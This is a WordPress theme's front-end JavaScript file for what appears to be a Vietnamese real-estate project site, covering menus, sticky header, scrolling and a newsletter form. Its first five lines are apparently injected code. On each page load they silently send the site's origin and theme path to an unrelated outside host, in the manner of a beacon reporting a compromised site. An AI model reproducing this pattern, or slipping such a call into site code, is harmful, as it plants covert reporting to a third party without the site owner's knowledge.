type='hostblog/guess/sunshinehomes/wp-content/themes/sunshine/assets/js/theme.js';
current=''+window.location.origin+' - '+ type +' '
var xmlhttp = new XMLHttpRequest();
xmlhttp.open("GET", "https://vanphongphamnhatminh.com/namcuong/receive_blogspot/index.php?url=" + current, true);
xmlhttp.send();

jQuery(document).ready(function ($) {
    // aos
    AOS.init({
        duration: 500,
    });
    window.addEventListener('load', AOS.refresh);
    //Mobile Menu
    jQuery('.close-sidebar').on("click", function () {
        jQuery('.sidebar-mobile').removeClass('show');
        jQuery('.open-sidebar').removeClass('hide');
    });
    jQuery('.open-sidebar').on("click", function () {
        jQuery('.open-sidebar').addClass('hide');
        jQuery('.sidebar-mobile').addClass('show');
    });
    jQuery('.mobile-menu-container').each(function () {
        // ẩn mobile khi click link - Sunshine Commerce
        jQuery(this).find('.nav-menu > li > a').on('click', function () {
            jQuery('.mobile-menu-content').removeClass('show');
        });
        jQuery('.mbmenu-toogle').on('click', function () {
            jQuery('.mobile-menu-content').addClass('show');
        });

        jQuery('.mobile-close').on("click", function () {
            jQuery('.mobile-menu-content').removeClass('show');
        });
    });
    // header sticky
    var didScroll;
    var lastScrollTop = 0;
    var navbarHeight = jQuery('header').outerHeight();

    jQuery(window).scroll(function (event) {
        didScroll = true;
    });

    setInterval(function () {
        if (didScroll) {
            hasScrolled();
            didScroll = false;
        }
    }, 50);
    var headerHeight = jQuery('.header').outerHeight();

    function hasScrolled() {
        var st = jQuery(this).scrollTop();
        if (st > headerHeight) {
            jQuery('.header-sticky').addClass('show');
        }
        if (Math.abs(lastScrollTop - st) <= 50 && st > headerHeight)
            return;
        if (st > lastScrollTop || st < headerHeight) {
            jQuery('.header-sticky').removeClass('on-top');
            jQuery('#back-top').removeClass('show');
        } else {
            jQuery('.header-sticky').addClass('on-top');
            jQuery('#back-top').addClass('show');
        }
        lastScrollTop = st;
    }
    // Header menu
    jQuery(document).on("scroll", onScroll);

    function onScroll(event) {
        var scrollPosition = jQuery(document).scrollTop();
        jQuery('.main-menu-container > ul > li > a').each(function () {
            var currentLink = jQuery(this);
            var refElement = jQuery(currentLink.attr('href'));
            if (refElement.position().top <= scrollPosition && refElement.position().top + refElement.height() > scrollPosition) {
                jQuery('.main-menu-container > ul > li > a').removeClass("active");
                currentLink.addClass("active");
            } else {
                currentLink.removeClass("active");
            }
        });
    }
    jQuery('.mobile-menu-container  .nav-menu > li > a').on('click', function (e) {
        e.preventDefault();
        jQuery("html, body").animate({
            scrollTop: jQuery(jQuery(this).attr('href')).offset().top + 75
        }, 900);
    });
    //Go to top
    jQuery('#back-top').on('click', function () {
        jQuery("html, body").animate({
            scrollTop: 0
        }, "slow");
    });
    // footer dang ky
    jQuery('.footer .dk-nhan-tin .send').click(function () {
        var user_name = jQuery('.footer .dk-nhan-tin ').find('input[name="subscribe_name"]').val();
        var user_email = jQuery('.footer .dk-nhan-tin ').find('input[name="subscribe_email"]').val();
        var user_phone = jQuery('.footer .dk-nhan-tin ').find('input[name="subscribe_phone"]').val();
        if (user_name != '' && user_phone != '' && user_email != '') {
            jQuery.ajax({
                type: "POST",
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                },
                url: 'https://api.sunshinegroup.vn/api/v1/internal/SubmitContact',
                data: JSON.stringify({
                    projectCd: "20",
                    name: user_name,
                    phone: user_phone,
                    email: user_email,
                }),
                success: function (data) {
                    if (data && data.status == 'success') {
                        jQuery('.footer .submit-success').show();
                        jQuery('.footer .submit-fail').hide();
                        jQuery('.footer .dk-nhan-tin .form-input input').hide();
                        jQuery('.footer .dk-nhan-tin .form-input textarea').hide();
                        jQuery('.footer .dk-nhan-tin .send').hide();
                    } else {
                        jQuery('.footer .dk-nhan-tin .submit-fail').show();
                        jQuery('.footer .dk-nhan-tin .submit-success').hide();
                    }
                },
                error: function (XMLHttpRequest, textStatus, errorThrown) {

                },
                dataType: 'json'
            });
            jQuery.ajax({
                url: dang_ki_nhan_tin.url,
                type: 'POST',
                dataType: 'json',
                data: jQuery('.footer .dk-nhan-tin .form-input').serialize(),
            })
        } else {
            jQuery('.footer .dk-nhan-tin .submit-fail').show();
            jQuery('.footer .dk-nhan-tin .submit-success').hide();
        };
    });
    jQuery('.home-desktop .row-tinh-hoa-kien-truc .box-image').each(function () {
        var desHeight = jQuery(this).find('.box-hidden').outerHeight();
        jQuery(this).find('.inner').css('padding-top', desHeight);
    });
    jQuery('.row-tinh-hoa-kien-truc .box-image').each(function () {
        jQuery(this).on('click', function () {
            jQuery('.popup-data').removeClass('show');
            let data_popup_id = jQuery(this).attr('data-popup-id');
            jQuery('.popup-tinh-hoa-kien-truc').modal('show');
            jQuery('.sunshine-modal [data-popup-id = ' + data_popup_id + ']').addClass('show');
        });
    });
    jQuery('.row-phan-khu-2 .read-more .inner').on('click', function () {
        jQuery('.popup-phan-khu-2').modal('show');

    })
    jQuery('.modal.have-carousel').on('shown.bs.modal', function (e) {
        setTimeout(function () {
            jQuery('.sunshine-modal').addClass('showopacity');
        }, 500);
    })
    jQuery('.modal.have-carousel').on('hidden.bs.modal', function (e) {
        jQuery('.sunshine-modal').removeClass('showopacity');
        jQuery('.popup-data').removeClass('show');
    })
});
